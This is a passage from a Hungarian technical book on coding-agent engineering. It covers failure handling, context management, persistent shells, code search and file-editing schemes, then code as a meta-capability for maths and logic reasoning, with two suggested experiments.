A pontszerű megszakítónál is alattomosabb a "halálspirál": a hibadvonalon triggerekett logika maga hívja az LLM-et, újra hibázik, és lépcsőzetesen terjed. Egy valós lépcsőzetes eset: az Ágens megáll egy kontextus-túlcsordulási hibán, ami elindít egy stop hook-ot (egy takarítási logika, amely automatikusan fut, amikor az Ágens véget ér), amely "kódot commitol kilépéskor," a hook meghívja az LLM-et egy commit üzenet írásához, a kontextus újra túlcsordul, és a hook újra elindul. A védelem két részből áll: tiltsunk le minden modell-meghívó mellékhatást a hibadvonalon (jobb egyszer elveszíteni egy segédfunkciót, mint az automatikus memóriakinyerést), és használjunk rekurziómélység-számlálót a maradék lépcsőzetes esetek érzékelésére és megtörésére. Végül, az összes automatikus mechanizmus felett globális megszakítási és eszkalációs feltételek állnak: maximális lépésszám, kapcsolati költségvetési korlát, és eszkaláció emberi beavatkozáshoz, ha az egymást követő hibák meghaladják a küszöbértéket (a 4. fejezet megtagadási megszakítója egy példa).

Visszatérve az 1. fejezet gondolatkérdésére, egy Ágens nem csak az eszközeredmények hiánya miatt ragadhat ciklusba, hanem ismétlődő azonos eszközhibák, hallucinált hívások, a kulcsfontosságú állapotot vesztő kontextustömörítés, vagy egy megoldhatatlan feladat miatt is. Az érzékelés a "hibaosztályozás + mintafelismerés" kombinációján, a helyreállítás a "fokozatos eszkaláción," a megszakítás a "megszakítók + globális plafonok + emberi eszkaláció" kombinációján alapul — ezek együtt alkotják a Harness teljes válaszát arra, hogy "az Ágens örökké futhat." Amit ezek a mechanizmusok megoldanak, az nem a "modell elégtelen képessége," hanem a "rendszer robusztussága határfeltételek mellett": a modellek egyre erősebbek lesznek, de a hálózatok megszakadnak, a folyamatok lefagynak, és a felhasználók váratlan dolgokat csinálnak. Még alapvetőbben, **egy Ágens megbízhatóságát nem az határozza meg, hogy követ-e el hibákat, hanem hogy minden hibafajtához tartozik-e megfelelő érzékelési, helyreállítási és megszakítási útvonal**.

### Implementációs Tippek Kódoló Ágensek Számára

A fent leírt munkafolyamat az ideális. Ahhoz, hogy a gyakorlatban működjön, néhány konkrét implementációs technikára van szükség — olyan módokra, amelyekkel növelhető a válaszsebesség és csökkenthető a kontextusfogyasztás anélkül, hogy a gondolkodás minősége romlana. Ezek a 2. és 4. fejezet általános Ágens technikái, a programozási területre alkalmazva.

**Párhuzamos Eszközhívások, Streaming Végrehajtás és Lépcsőzetes Megszakítás.**

A hagyományos Ágens implementációk gyakran sorosan működnek: generálnak egy eszközhívást, végrehajtják, megkapják az eredményt, majd eldöntik a következő lépést. Ez a szigorú sorba állítás rengeteg időt pazarol.

A modern Kódoló Ágenseknek teljes mértékben ki kell használniuk a streaming válaszokat: a 2. fejezet bevezette ezt a mechanizmust a modell kimeneti sorrendjének tárgyalásakor — amint az első eszközhívás paraméterei teljesen legenerálódtak és átmentek a validáción, a végrehajtás azonnal megkezdődhet, anélkül, hogy meg kellene várni a modell további eszközhívásainak generálását. Például, ha a modellnek három eszközhívást kell kiadnia egyetlen inferenciában — kód keresése, konfigurációs fájlok ellenőrzése és naplók olvasása — az első hívás elkezdhet végrehajtódni, amint a paraméterei elkészültek és érvényesítésre kerültek, átfedésben a másik kettő generálásával. A független hívások párhuzamosan is végrehajthatók, nem sorba állítva. Ez az átfedő végrehajtás jelentősen csökkenti a végponttól végpontig tartó késleltetést, így az Ágens válaszai mozgékonyabbá válnak.

A párhuzamos végrehajtás másik oldala a hibakezelés. Minden eszközdefiníciónak deklarálnia kell, hogy támogatja-e a párhuzamos végrehajtást (alapértelmezett nem, biztonsági tartalék). Amikor egy hívás meghiúsul, egy lépcsőzetes megszakítási mechanizmus leállítja más, ugyanabban a kötegben indított hívásokat, amelyek függenek az eredményétől, de nem érinti a független hívásokat vagy a szülő műveletet — ez a "hiba határ szabályozás" elv konkrét megvalósítása a Harness mérnökség szakaszból.

"Finomszemcsés Kontextuskezelés."

A Kódoló Ágensek alapvető kihívása, hogy a kódbázisok általában nagyok, de a modell kontextusablaka korlátozott. Még ha a fejlett modellek milliós tokenszámot is ígérnek is, a teljes kódbázis a kontextusba töltése sem gazdaságos, sem szükséges. Az intelligens kontextuskezelésnek több szinten kell működnie.

A fájl olvasás szintjén az Ágens ne mindig olvassa a teljes fájlt. Nagy fájlok esetén az eszköznek támogatnia kell a meghatározott sorközök olvasását — például csak a 100-150 sorok olvasását, ahelyett, hogy egy több ezer soros fájlt töltene be. Még fontosabb, hogy a tartalom visszaadásakor sorszámokat kell csatolni — minden kódsor elé kerüljön a tényleges sorszáma. Ez az egyszerűnek tűnő tervezés nagy értéket hoz: a modell pontosan hivatkozhat a `src/main.py` 42. sorára," csökkentve a kétértelműséget és megbízhatóbbá téve a későbbi szerkesztési műveleteket.

A parancsvégrehajtás szintjén a terminál kimenet kezelése is körültekintést igényel. A fordítás vagy tesztelés több ezer sornyi kimenetet produkálhat. Ha mindezt a kontextusba injektáljuk, a költségvetés gyorsan kimerül. A 4. fejezetben bevezetett hosszú kimenet csonkítási és perzisztencia mechanizmus széles körben alkalmazásra kerül itt: tartsuk meg a kimenet első néhány sorát (általában a hibakontextust tartalmazza) és az utolsó néhány sort (általában a hibák összefoglalását tartalmazza), cseréljük ki a középső részt egy egysoros helyettesítővel, és jegyezzük meg, hogy a teljes kimenet egy ideiglenes fájlba van mentve igény szerinti megtekintéshez.

"Környezeti Információ Dinamikus Injektálása."

Ez a 2. fejezet Ágens állapotsáv technikájának koncentrált megnyilvánulása a Kódoló Ágensekben. Az általános Ágensektől eltérően a Kódoló Ágensek erősen függenek a végrehajtási környezet állapotától. Minden inferencia előtt a következő kulcsfontosságú környezeti információkat kell injektálni a kontextus végére egy Ágens állapotsáv formájában:

- "Aktuális munkakönyvtár": biztosítja, hogy az elérési utak helyesek legyenek
- "Git branch": tudja, hogy a fő branch-en vagy egy feature branch-en dolgozik-e
- "Legutóbbi commit előzmények": megérti a projekt fejlődését
- "Stagingelt és nem stagingelt változtatások áttekintése": tudja, milyen módosítások történtek

Ezeket az információkat nem szabad statikus rendszer promptokba kódolni — ez tönkretenné a KV Cache hatékonyságát —, hanem dinamikusan kell generálni és hozzáfűzött Ágens állapotsávként injektálni. Ily módon az Ágens "környezeti tudatosságra" tesz szert, minden döntése az aktuális állapot pontos megértésén alapul, nem pedig elavult feltételezéseken.

"A Parancsvégrehajtási Környezet Állapotának Perzisztenciája."

Amikor az Ágens kóddal dolgozik, sok művelet függ a környezet állapotától: könyvtárváltás, virtuális környezet aktiválása, környezeti változók beállítása, háttérszolgáltatások elindítása. Ha minden parancsot egy friss shell-ben hajtunk végre, ez az állapot elveszik — az Ágens éppen a `cd` paranccsal a projektkönyvtárba navigált, de a következő parancs újra a shell alapértelmezett könyvtárában indul, ami arra kényszeríti, hogy megismételje ugyanazt a beállítást. Ráadásul egyes műveletek (mint a Python virtuális környezet aktiválása) hatásai csak az aktuális shell kapcsolaton belül érvényesek, és nem vihetők át a kapcsolatok között.

A megoldás a "perzisztens shell kapcsolat". Minden egyes eszközhívásnál az Ágens ugyanabban a shell kapcsolatban hajtja végre a parancsokat, megőrizve a munkakönyvtárat és a környezeti állapotot a hívások között. A gyakorlati implementáció egy szálbiztos munkamenet puffert használ: a kimenet párhuzamos olvasható, miközben a parancsok szekvenciálisan futnak, és a puffer kapacitásának túllépésekor a kimenet automatikusan ideiglenes fájlba kerül. Pontosabban, a tipikus implementáció egy pseudoterminal-t (PTY) használ a folyamatkapcsolat mögött, hogy ne csak a kimeneti adatfolyamot, hanem a terminál interaktív viselkedésének szimulációját is fenntartsa (mint a shell parancssora, a törlés/visszaépítés és a beviteli puffer). A perzisztens kapcsolat bevezeti a "kapcsolat szintű erőforrás szivárgás" problémáját: a shell kapcsolat által létrehozott erőforrásokkal (ideiglenes fájlok, gyermekfolyamatok, állomány leírók) nem gazdálkodnak automatikusan a kapcsolat megszakadásakor, szisztematikus takarítást igényelve.

Meg kell jegyezni, hogy ez a mechanizmus ellentétben áll a korábban tárgyalt Sessionless architektúrával. A Sessionless elvárja, hogy a munkakörnyezet állapota perzisztens maradjon az üzenetek között, de a perzisztens shell kapcsolat ezt csak az aktuális feladaton belül éri el. Az Ágens munkafolyamatának hatékonyságának biztosításához a két mechanizmus kombinációja szükséges: a perzisztens kapcsolat a rövid távú, feladaton belüli állapot-megtartáshoz; a munkaterület fájl perzisztencia (a Sessionless megközelítés) a feladatok közötti hosszú távú környezeti állapot megőrzéséhez.

**Azonnali szintaxis visszacsatolási mechanizmus.**

Ez ismét bizonyítja az ügynök állapotsor technika értékét. Miután az ügynök módosította a kódot, nem szabad megvárnia, amíg a felhasználó kifejezetten kéri a tesztelést a szintaxis ellenőrzése előtt. Hatékonyabb megközelítés, ha az eszközréteg automatikusan futtatja a megfelelő linter- vagy szintaktikai ellenőrzőt, amint a fájlírási művelet befejeződött, és az eredményeket az eszköz visszatérési értékének részeként jeleníti meg az ügynöknek. Ha szintaktikai hibát észlel, az ügynök azonnal látja a részletes hibainformációkat a következő következtetési körben – akárcsak az IDE azonnal megjelöl egy páratlan zárójelet. Ez az azonnali visszacsatolási mechanizmus jelentősen csökkenti a hibajavítás költségeit, mivel az Ügynök a hibát a bevezetés pillanatában kijavíthatja anélkül, hogy megvárná a tesztek futtatását a probléma felfedezésére.

Ez az öt megvalósítási technika – párhuzamosság és streaming, kontextuskezelés, környezettudatosság, állapotmegőrzés és azonnali visszacsatolás – együtt alkotja a hatékony kódoló ügynök technikai alapját. Ezek nem elszigetelt optimalizálási pontok, hanem egymást erősítő tervezési döntések, amelyek mind egyetlen cél felé mutatnak: lehetővé teszik, hogy az ügynök olyan zökkenőmentesen működjön, mint egy tapasztalt fejlesztő.

### Keresőeszközök a kódoló ügynökökben

A megfelelő kód megtalálása egy nagy kódbázisban a kódoló ügynök munkájának kiindulópontja. Az 5-3. ábra számos kiegészítő keresési eszközt hasonlít össze, bemutatva, hogy egy érett kódoló ügynöknek hogyan kell kiválasztania a visszakeresési módszereket a feladat természete alapján.

![5-3. ábra: A kódolóügynök-kereső eszközök összehasonlítása](images/fig5-3.svg)

**Regex Content Matching** (grep/ripgrep): A leghagyományosabb keresési módszer, a fájltartalom soronkénti keresése a mintaegyezésekért. Ha az ügynök pontosan tudja a keresendő szöveget (függvénynevek, változónevek, hibaüzenetek), minden előfordulást gyorsan és pontosan meg tud találni. A reguláris kifejezések kifejezőereje (a szövegminták speciális szimbólumokkal történő leírására szolgáló szintaxis, pl. a `def handle.*` megfelel a `handle` karakterekkel kezdődő összes függvénydefiníciónak) összetett mintákat rögzít – nem csak szó szerinti szöveget, hanem egy adott szerkezethez igazodó kódot is. A gyakorlatban a fájltípus-szűrést (csak Python-fájlok keresése) és az útvonalminta-szűrést (tesztkönyvtárak kizárása) is támogatni kell a zaj csökkentése érdekében. Az alapvető korlát: csak szöveges egyezéseket talál, és nem érti a szemantikát – a "felhasználói hitelesítés" kifejezésre keresve soha nem fog megjelenni olyan függvény, amely kezeli a bejelentkezési logikát, de történetesen nem tartalmazza a "hitelesítés" szót.

**Filename Pattern Matching** (glob): figyelmen kívül hagyja a fájl tartalmát, csak a fájlrendszer elérési útstruktúrájában keres a mintának megfelelő fájlok után. Például a `**/*.test.ts` rekurzív módon megtalálja az összes TypeScript-tesztfájlt, a `src/components/**/Button.tsx` pedig a Button.tsx fájlt bármely mélységben megkeresi az összetevők alatt. Sokkal gyorsabb, mint a tartalomkeresés (nincs szükség fájlok megnyitására és olvasására), és az ügynök első lépése a projektszerkezet feltárásában – a projekt szervezeti keretének gyors felállítása a teljes fájlrendszer átvizsgálásával.

**Szemantikus kódkeresés**: Az első két pontos egyezési módszertől eltérően megpróbálja megérteni a lekérdezés és a kód "értelmét". Két fő problémát kell megoldania:

- **Struktúra-tudatos darabolás**: A kódnak szigorú szintaktikai struktúrája van, és teljes szemantikai egységekre, például függvényekre, osztályokra és metódusokra kell felosztani, nem pedig fix számú karakterrel való vakvágásra.
- **Hibrid visszakeresés** (a 3. fejezet részletesen ismerteti ezt a technológiai készletet): A vektoros beágyazások jól megtalálják az eltérő megfogalmazású, de szemantikailag hasonló kódot – például a „felhasználó azonosságának ellenőrzése” keresés egy `check_credentials` nevű függvényt is felszínre hozhat. A kulcsszóegyeztetés, például a BM25, ezzel szemben a függvény- és változónevek pontos megtalálásában erős. A két módszer párhuzamosan fut, az eredményeket pedig egy újrarangsoroló – a jelöltek relevanciáját finoman értékelő keresztkódoló – egyesíti és rendezi, így a módszerek kiegészítik egymást.

A szemantikus keresés különösen alkalmas feltáró jellegű feladatokhoz, mint például az „adatbázissal való interakcióhoz” vagy a „felhasználói bemenet érvényesítésének kezeléséhez” kapcsolódó kód megtalálásához egy ismeretlen kódbázisban.

Az iparágban azonban egyértelmű vita folyik arról, hogy érdemes-e beágyazó indexeket építeni a szemantikai kereséshez. A terminálalapú ügynökök, mint például a Claude Code, szándékosan **nem építenek beágyazó indexeket**, pusztán az ügynöki grep + glob-ra hagyatkoznak a repülés közbeni visszakereséshez – így elkerülhető, hogy a kód fejlődése során elavult indexeket tartsanak fenn, megszünteti a teljes indexelési infrastruktúrát, és elkerüli annak kockázatát, hogy kódbeágyazásokat küldjenek harmadik féltől származó szolgáltatásoknak. Az IDE-alapú eszközök, mint például a Cursor, az ellenkező megközelítést alkalmazzák: hajlandóak fizetni a **fájlok közötti szemantikai visszahívás** indexek felépítésének költségeit, beágyazó indexeket használva, hogy gyorsan megtalálják a szemantikailag kapcsolódó, de eltérő megfogalmazású töredékeket nagy kódbázisokban. A két útvonal közötti kompromisszum lényegében az "infrastruktúra és adatkilépés költségeinek" és "a fájlok közötti szemantikai visszahívás előnyeinek" mérlegelésében rejlik.

**Szimbólumszintű definíció- és hivatkozáskeresés**: Ez a módszer az IDE „ugrás a definícióhoz” és „összes hivatkozás keresése” képességeit használja. Ezeket rendszerint az LSP (Language Server Protocol), vagyis a szerkesztők és a nyelvelemző motorok kommunikációját szabványosító protokoll biztosítja. A keresés megkülönbözteti a definíciót a hivatkozásoktól: például a 42. sorban álló `authenticate` elemet függvénydefinícióként, a 189. sorbeli előfordulást pedig hívásként azonosítja, míg a szöveges keresés csak a karakterláncot tartalmazó sorokat találja meg. Ez különösen fontos kódátalakításkor: egy függvény átnevezésénél a név megjegyzésekben és karakterláncokban is szerepelhet, ezért szimbólumkereséssel kell pontosan megtalálni a definíciót és a tényleges hívási helyeket.

Ez a négy keresési módszer egy kiegészítő eszköztárat alkot, amelyet gyakran kombinálnak a gyakorlatban: először használjon szemantikus keresést a releváns modulok megtalálásához, majd használja a regex-illesztést bizonyos kódsorok pontos megkereséséhez, végül pedig használja a szimbólumkeresést a hívási lánc nyomon követésére – ez egy progresszív stratégia „a durvától a finomig, a szemantikától a szintaxisig”.

### Fájlszerkesztő eszközök a kódoló ügynökökben

A fájlszerkesztés nehézsége nem magában a műveletben rejlik, hanem abban, hogyan lehet hatékonyan és megbízhatóan megmondani a rendszernek, hogy "mit változtasson és hogyan változtasson" egy LLM segítségével. Az 5-4. ábra öt fájlszerkesztési sémát hasonlít össze, bemutatva az alapvető feszültséget az emberi nyelvi kifejezés és a gépi precíz végrehajtás között.

![5-4. ábra: Öt fájlszerkesztő séma összehasonlítása](images/fig5-4.svg)

**Eltérő leírás + Modell alkalmazása**: A modell nem határozza meg közvetlenül a fájl szerkesztésének módját; ehelyett módosításleírást generál – amely lehet a git diff-hez hasonló diff szöveg (a `git diff` parancs által kiadott formátum, amely megmutatja, hogy "melyik sorokat törölték és melyek kerültek hozzáadásra"), vagy egy kódvázat kihagyásjelzőkkel (például "itt változatlan marad" megjegyzésekkel a nem módosított részek kihagyásához). Ezt a leírást azután átadják egy speciális "Apply Model"-nek – általában egy másik, kisebb, gyorsabb LLM-nek –, amely felelős azért, hogy összeolvassa azt az eredeti fájllal, hogy létrehozza a teljes új fájlt. Az aggodalmak e szétválasztása lehetővé teszi, hogy a fő modell a magas szintű kódlogikára, az alkalmazásmodell pedig az alacsony szintű szövegműveletekre összpontosítson. A naiv megvalósítás törékenysége az összevonási lépésben rejlik: ha kisebb eltérések vannak a változtatás leírása és a tényleges fájlkód között, meg kell határoznia, hogy ugyanarra a helyre vonatkoznak-e; ha több hasonló kódrészlet van, előfordulhat, hogy rossz helyre olvad össze. A kurzor ennek a megközelítésnek a folyamatos fejlődését reprezentálja: a fő modell kihagyásjelzőkkel ellátott kódvázat ad ki, egy speciálisan kiképzett, gyorsan alkalmazható kis modell újraírja a teljes fájlt, és a spekulatív dekódolás (az eredeti fájltartalom vázlatként történő felhasználása párhuzamos ellenőrzéshez) az egyesítési sebességet másodpercenként több ezer tokenre növeli – a mérnöki befektetés megvette ezt a megközelítést.

**Old String → New String**: A Claude Code által alkalmazott megközelítés. A modell egy régi karakterláncot (az eredeti cserélendő szöveget) és egy új karakterláncot (a helyettesítő szöveget) biztosít, a keretrendszer pedig egy egyszerű karakterlánc keresést és cserét hajt végre. Az előny a kiszámíthatóság és az átláthatóság – ha a régi karakterlánc létezik, és egyedi a fájlban, akkor sikeres; különben nem sikerül. Nincs kétértelműség. A költség az, hogy a nagy kódblokkok törléséhez az összes eredeti tartalom teljes kiadása szükséges; egyetlen karakter eltérés az egyezés sikertelenségét okozza. Ha ugyanaz a kód többször megjelenik, hosszabb kontextust kell megadni az egyértelműség érdekében.

**Sorszám szerinti célzás** (Régi sorszámok → Új karakterlánc): A modell meghatározza az "X-től Y-ig terjedő sorok törlése, új tartalom beszúrása" parancsot. A sorszámok pontosak és egyértelműek, és a nagy blokkok törléséhez mindössze két számra van szükség. A modell azonban hajlamos a hibákra a sorszámok "számlálása" során, különösen a nagyon hosszú fájlok esetében. A gyakorlatban ezt enyhítik, ha a fájl olvasása során sorszám-jegyzeteket adnak minden sorhoz, de a következő sorszámok minden szerkesztés után megváltoznak, korlátozva a többszörös szerkesztés párhuzamosságát.

**Vim-szerű szerkesztési parancsok**: kölcsönzés a Vim szerkesztő parancsrendszeréből, amely támogatja az olyan gazdag műveleteket, mint a másolás, kivágás és beillesztés. Nagyon hatékony a kód átstrukturálásához (egy funkció áthelyezése egyik helyről a másikra). De a parancs szintaxisa valódi tanulási terhet hordoz: a legerősebb modellek jól kezelik; a kisebb modellek észrevehetően több hibát követnek el.

**Karakterlánc kezdete + vége egyezés** (Régi karakterlánc kezdete + vége → új karakterlánc): Ez a régi karakterlánc-cseresémához képest előrelépésnek tekinthető. A modellnek nem kell a teljes régi karakterláncot kiadnia; csak a törlendő tartalom első néhány sorát és az utolsó néhány sort kell megadnia, a középső részt kihagyva. A keretrendszer megkeresi a csereterületet ebből a kezdő- és végpárból, feltéve, hogy a kombináció egyedi a fájlon belül. Ez a séma egyesíti a szövegcsere megbízhatóságát a sorszámos megközelítés hatékonyságával – nagy kódblokkok törlésekor nem kell több száz sornyi eredeti kódot kiadni, csak a határokat kell megjeleníteni. Ugyanakkor, mivel továbbra is a tartalomegyeztetésen alapul, nem pedig az absztrakt sorszámokon, viszonylag alacsony annak a kockázata, hogy a modell hibázik.

**Gyakorlati tanácsok.** A mainstream kódoló ügynökök két táborba sorolhatók, mindegyiknek megvan a maga zászlóshajója: a Claude Code átveszi a "régi karakterláncot az új karakterláncba" – az első a megbízhatóság, egyszerű a megvalósítás, nincs szükség extra modellre; A Cursor a korlátok közé szorította az Apply Model (Modell alkalmazása) útvonalat – a nagyobb szerkesztési teljesítményért cserébe fizetett a betanításért és a dedikált gyorsalkalmazási modell következtetéseiért. Ha saját ügynököt épít, a "régi karakterlánc az új karakterlánchoz" a legbiztonságosabb kiindulópont; nagyszabású szerkesztéseknél a "string start + end matching" a gazdaságosabb kompromisszum; a sorszám-megközelítés csak mély IDE-integráció mellett megbízható (ahol a szerkesztő éles sorszám-leképezést tart fenn, és minden szerkesztés után újra ellátja a modellt) – különben a sorszám-sodródás elsüllyeszti azt.


### Gyakori Hibák és Gyors Elemzés a Kódoló Ágensek Gyakorlatában

Amikor az Ágens tartalmaz egy kontextusablakot, gazdag visszajelzést és tud hivatkozni a kódra, a felhasználók hajlamosak ezt részletes technikai útmutatóként használni. De az Ágens gyakran vakmerően módosít olyan fájlokat, amelyeket nem kellene, különösen amikor nem teljesen érti a kód architektúráját. Az alábbiakban néhány gyakori hiba és rövid elemzés található:

Először is, az Ágens "szükségtelen módosításokat" végezhet olyan fájlokon, amelyek nem kapcsolódnak a feladathoz. Például javíthat olyan kódot, amely a felhasználó által kért funkcióhoz kapcsolódik, de valójában nem része a közvetlen kérésnek. Ez azért történik, mert az Ágens kódgenerálási folyamata nem automatikusan határozza meg a minimális szerkesztési határt; gyakran úgy dönt, hogy "mivel itt vagyok, javítsam meg ezt a furcsa kódot is." Ennek elkerülésére az Ágensnek először hivatkoznia kell a feladat specifikus fájljaira, el kell kerülnie a kapcsolódó fájlok szükségtelen módosítását, és a parancs előtt egyértelmű határvonalat kell húznia.

Másodszor, az Ágens "félreértheti a kérés szándékát", ami nem megfelelő megoldásokhoz vezet. Például, amikor a felhasználó azt mondja, "Tedd lehetővé, hogy a hirdetések mellett a termékek képe is megjelenjen," az Ágens összetévesztheti a "hirdetés" kifejezést a funkció nevével és elvész a részletekben. A megoldás az, hogy a kódolás előtt összefoglalja a felhasználói kérés szándékát és visszaigazolja a felhasználó számára a pontosításhoz.

Harmadszor, a "forráskód felfedezésének elmulasztása" gyakori hiba. Az Ágens gyakran kihagyja a kódbázis felfedezésének lépését, és közvetlenül kódolásba kezd, ami hozzáférhetetlen modulok meghívásához vezet. Itt az a javaslat, hogy a Kódoló Ágens tegyen szert arra a szokásra, hogy minden kódolás előtt automatikusan felfedezze a projekt könyvtárstruktúráját.

Negyedszer, az Ágens "felesleges duplikációt" hozhat létre. Amikor egy arra vonatkozó követelmény merül fel, hogy "adj hozzá egy időzítőt," az Ágens egy teljesen új modult hozhat létre, ahelyett, hogy ellenőrizné, létezik-e már egy. A hatékony Ágens implementációnak az a szokása, hogy először keres, aztán fejleszt.

Végül, az Ágens **nem veszi figyelembe a kód szélső eseteit**. A kód sikeresen lefordul, de specifikus bemenetek esetén futásidejű hibák léphetnek fel. Ilyenkor specifikus tippeket kell adni a szélső esetek kezeléséhez.

## Kód: Egy általános ügynök metaképessége

Az előző rész bemutatta, hogyan lehet megbízható kódoló ügynököt felépíteni – az architektúrától az eszközmegvalósításon át a mérnöki tervezésig. A kódgenerálás értéke azonban messze túlmutat a programok írásán.

> **Mi az a "meta-képesség"?** A közönséges képesség az ügynök azon képessége, hogy egy adott dolgot elvégezzen – válaszoljon egy kérdésre, hívjon meg egy bizonyos API-t, generáljon egy szövegrészt. A **meta-képesség** egy olyan képesség, amely "más képességeket tud létrehozni": az Ügynök arra használja, hogy új eszközöket, új megszorításokat és új kifejezési formákat írjon le menet közben egy feladat elvégzéséhez anélkül, hogy minden képességet előre be kellene építenie. A kódgenerálás pontosan egy ilyen meta-képesség – precíz, végrehajtható és összeállítható, lehetővé téve új eszközök (szkriptek, API-hívási sorozatok), új megszorítások (állítások, érvényesítési szabályok) és új kifejezési formák (HTML-formák, PPT-k, videokockák) előállítását.

Emiatt a kód szerepe az ügynökrendszerben messze túlmutat a „programok írásán”. A következő hat rész azt mutatja be, hogyan alkalmazható ez a metaképesség a programozáson túl: (1) gondolkodási eszközként – a természetes nyelvnél szigorúbb érveléshez; (2) üzleti szabályok korlátjaként – az irányelvek megszilárdítására és a modellhallucinációk kivédésére; (3) multimédia-generálásra – prezentációk, videók és vizualizációk létrehozására; (4) rendszeradapterként – heterogén API-k összekapcsolására; (5) generatív felhasználói felületként – űrlapok és felületek dinamikus előállítására; (6) önépítésre – új ügynökök létrehozására.

Ez a hat irány nem pusztán egy lapos lista; belülről kifelé haladnak, az objektum által szervezve, amelyre a metaképességet alkalmazzák:

1.  **Gondolkodás maga** – kód használata a hibára hajlamos természetes nyelvű érvelés helyettesítésére (Thinking Tools);
2.  **Üzleti szabályok** – homályos házirendek kódolása végrehajtható kényszerként (Business Rule Constraints);
3.  **Tartalombemutató** – PPT-k, videók és vizualizációs műtermékek generálása (Multimédia-generáció);
4.  **Rendszerinterfészek** – heterogén API-k áthidalása és automatikusan alkalmazkodnak a fejlődő adatformátumokhoz (rendszeradapterek);
5.  **Felhasználói felületek** – dinamikusan felépítő űrlapok és interaktív felületek (generatív felhasználói felület);
6.  **Maga az ügynök** – kód használata új ügynökök létrehozására vagy javítására, ezáltal lehetővé téve a rendszerindítást.

Ezt a szálat követve – belülről kifelé, és végül vissza az ügynökig – könnyebben láthatóvá válik a kód, mint meta-képesség egységes értéke. Erre az alapra építve a 8. fejezet azt vizsgálja, hogy milyen működési bizonyítékoknak kell kiváltania az önmódosítást, és hogy a javasolt módosítások hogyan kerülnek új verzióba tesztelés, kiadás és visszaállítás révén.

### A kód mint gondolkodási eszköz

Az LLM-ek figyelemre méltóak a természetes nyelv megértésében és generálásában, de alapvetően gyengék a precíz számításban, a szimbolikus manipulációban és a szigorú logikai levezetésben. Az ok: egy modell gondolkodása eredendően valószínűségi és közelítő, míg a matematikai és logikai problémák determinisztikus, egzakt válaszokat igényelnek. Egy konkrét összehasonlítás a lényeg:

```
Problem: "A class has 40 students. 60% take math, 45% take physics, and 25% take both.
          How many students take only physics but not math?"

Pure Natural Language Reasoning (prone to errors):      Code Reasoning (precise and verifiable):
"60% take math = 24 students,                           math = int(40 * 0.60)    # 24
 45% take physics = 18 students,                        phys = int(40 * 0.45)    # 18
 25% take both = 10 students,                           both = int(40 * 0.25)    # 10
 Only physics = 24 - 10 = 14 students"                  only_phys = phys - both  # 8
→ Mistakenly subtracts from math count, answer wrong    → print(only_phys)  # 8 ✓
```

Legyen az LLM felelős a probléma megértéséért és a kód megírásáért, a kódértelmező pedig a pontos számításért – ez a munkamegosztás lehetővé teszi, hogy mindenki kijátssza a maga erősségeit.

Stephen Wolfram, a Mathematica megalkotója mélyreható betekintést nyújtott ebbe. Az LLM-ek létezése előtt már léteztek olyan rendszerek, amelyek képesek voltak precíz matematikai számításokra – **Symbolic Computation** használatával dolgoztak, azaz a kifejezéseket matematikai szimbólumokkal dolgozták fel, nem pedig hozzávetőleges numerikus értékeket. Például egy hagyományos számológép a $\sqrt{2}$ értéket 1,414-re közelíti, míg egy szimbolikus számítási rendszer megőrzi a pontos $\sqrt{2}$ formát, és csak szükség esetén konvertálja tizedesjegyre. A Wolfram által létrehozott Wolfram Alpha egy ilyen rendszer: a felhasználók beírnak egy matematikai feladatot, amely pontos választ ad vissza. Természetes nyelvi értelmezése azonban meglehetősen törékeny, lefedettsége pedig szűk – egy beépített nyelvtani elemzőre támaszkodik, amely csak korlátozott számú megfogalmazást képes felismerni; a megfogalmazás enyhe módosítása az elemzés sikertelenségét okozhatja, és természetesen nem tudja kezelni a nyílt tartományú többlépéses érvelést. Az LLM-ek tökéletesen kitöltik ezt a hiányt – kiválóak a különféle természetes nyelvi kifejezések megértésében, de nem jók a precíz számításban. Az új kollaboratív modell a következő: legyen az LLM felelős a felhasználó természetes nyelvi kérdésének megértéséért, a benne lévő matematikai vagy logikai struktúra azonosításáért, és formális nyelvre (például a Mathematica nyelvre vagy a Python SymPy könyvtárára) történő lefordításáért; majd adja át egy dedikált szimbolikus számítási motornak vagy kényszermegoldónak végrehajtásra a pontos eredmények elérése érdekében.

> **5-1. kísérlet ★★: Kódgeneráló eszközök használata a matematikai problémamegoldó képesség javítására**
>
> **Kísérlet célja**: Ellenőrizze, hogy egy ügynök matematikai gondolkodása pontosabban fejlődött-e, ha Kódtolmács segíti.
>
> **Technikai megközelítés**: Szerelje fel az ügynököt egy Python sandbox-tal, amely matematikai könyvtárakat tartalmaz, mint a sympy, numpy és scipy. Ha az ügynök matematikai problémával találkozik, Python-kódba formalizálja: sympy a szimbolikus számításokhoz (számítás, egyenletmegoldás), scipy a numerikus optimalizáláshoz, numpy a mátrixműveletekhez. A generált kód a homokozóban fut le, hogy pontos eredményeket adjon vissza.
>
> **Elfogadási kritériumok**: Értékelje az AIME-stílusú feladatokat (az American Invitational Mathematics Examination mintájára). Hasonlítsa össze a tiszta gondolatlánc pontosságát a kóddal segített érvelés pontosságával; a kód-asszisztált módnak lényegesen nagyobb pontosságot kell elérnie. Ellenőrizze, hogy a kód megfelelően használja-e a matematikai könyvtárakat, és hogy a megoldási folyamat logikailag egyértelmű-e.
>

> **5-2. kísérlet ★★: Kódgeneráló eszközök használata a logikai érvelési képesség javítására**
>
> **Kísérlet célja**: Felméri az ügynök azon képességét, hogy logikai érvelést hajtson végre a kényszermegoldó kód segítségével.
>
> **Technikai megközelítés**: Szerelje fel az ügynököt egy kódértelmezővel, amely tartalmazza a python-kényszerkönyvtárat. Az Agent a logikai rejtvényeket, például a Knights és a Knaves-problémákat formális kényszermodellekre fordítja: azonosítja a változókat (minden szigetlakó személyazonosságát), megszorításként kódolja a szabályokat, mint például a „lovagok mondják az igazat”, és meghívja a megoldót, hogy kielégítő feladatot találjon.
>
> **Elfogadási kritériumok**: Értékelje a [K&K Puzzle dataset](https://huggingface.co/datasets/K-and-K/perturbed-knights-and-knaves). A kód-asszisztált módnak 90% feletti megoldási pontosságot kell elérnie, ami lényegesen magasabb, mint a tiszta gondolkodásmód.
>

